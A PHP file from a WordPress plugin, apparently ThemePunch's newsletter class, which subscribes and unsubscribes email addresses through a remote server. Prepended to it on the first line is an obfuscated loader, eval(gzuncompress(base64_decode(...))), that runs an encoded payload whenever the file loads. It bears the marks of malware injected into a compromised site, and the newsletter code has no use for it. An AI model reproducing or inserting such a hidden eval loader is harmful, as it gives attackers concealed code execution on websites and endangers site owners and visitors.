<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * @author    ThemePunch <info@themepunch.com>
 * @link      http://www.themepunch.com/
 * @copyright 2015 ThemePunch
 * @version   1.0.0
 */
 
if( !defined( 'ABSPATH') ) exit();

if(!class_exists('ThemePunch_Newsletter')) {
	 
	class ThemePunch_Newsletter {
	
		protected static $remote_url	= 'http://newsletter.themepunch.com/';
		protected static $subscribe		= 'subscribe.php';
		protected static $unsubscribe	= 'unsubscribe.php';
		
		public function __construct(){
			
		}
		
		
		/**
		 * Subscribe to the ThemePunch Newsletter
		 * @since: 1.0.0
		 **/
		public static function subscribe($email){
			global $wp_version;
			
			$request = wp_remote_post(self::$remote_url.self::$subscribe, array(
				'user-agent' => 'WordPress/'.$wp_version.'; '.get_bloginfo('url'),
				'timeout' => 15,
				'body' => array(
					'email' => urlencode($email)
				)
			));
			
			if(!is_wp_error($request)) {
				if($response = json_decode($request['body'], true)) {
					if(is_array($response)) {
						$data = $response;
						
						return $data;
					}else{
						return false;
					}
				}
			}
		}
		
		
		/**
		 * Unsubscribe to the ThemePunch Newsletter
		 * @since: 1.0.0
		 **/
		public static function unsubscribe($email){
			global $wp_version;
			
			$request = wp_remote_post(self::$remote_url.self::$unsubscribe, array(
				'user-agent' => 'WordPress/'.$wp_version.'; '.get_bloginfo('url'),
				'timeout' => 15,
				'body' => array(
					'email' => urlencode($email)
				)
			));
			
			if(!is_wp_error($request)) {
				if($response = json_decode($request['body'], true)) {
					if(is_array($response)) {
						$data = $response;
						
						return $data;
					}else{
						return false;
					}
				}
			}
		}
		
	}
}

?>